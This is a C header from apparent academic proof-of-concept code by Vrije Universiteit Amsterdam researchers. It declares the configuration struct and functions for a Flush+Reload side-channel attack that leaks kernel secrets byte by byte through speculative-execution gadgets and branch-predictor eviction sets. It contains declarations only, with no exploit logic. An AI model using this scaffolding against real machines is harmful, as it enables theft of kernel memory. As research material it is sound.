/*
 * Friday, October 27th 2023
 *
 * Sander Wiebing - s.j.wiebing@vu.nl
 * Alvise de Faveri Tron - a.de.faveri.tron@vu.nl
 * Herbert Bos - herbertb@cs.vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 *
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

#ifndef _FLUSH_AND_RELOAD_H_
#define _FLUSH_AND_RELOAD_H_

#include <stdint.h>
#include "evict_pht.h"
#include "targets.h"


struct config {
    int fd_sock;
    int epoll;

    int fd_insert_check;
    int fd_remove_check;

    uint8_t * fr_buf;
    uint8_t * fr_buf_kern;
    uint8_t * reload_addr;
    uint8_t * ind_map;
    uint8_t * ind_map_kern;
    uint8_t * secret_addr;
    uint8_t * history;

    uint8_t * tfp_leak_target;

    uint8_t * tfp_arg;

    uint8_t * gadget_arg_tfp;
    uint8_t * gadget_arg_secret_addr;
    uint8_t * gadget_arg_base;

    uint8_t * phys_start;
    uint8_t * phys_end;

    uint64_t * ind_tb_addr;
    uint64_t * ind_secret_addr;
    uint64_t * ind_tfp_target;


    pht_config * pht_cfg;
    pht_config * all_pht_cfg[NUMBER_OF_EVICT_SETS];
};

void set_load_chain_simple_touch(struct config * cfg, int number_of_loads);

void set_load_chain_leak_secret(struct config * cfg);

uint64_t do_flush_and_reload(struct config * cfg, uint64_t iterations, uint8_t ret_on_hit);

int leak_byte_forwards(struct config * cfg, uint64_t prefix);

void print_leakage_rate(struct config * cfg, uint64_t iterations);


#endif //_FLUSH_AND_RELOAD_H_
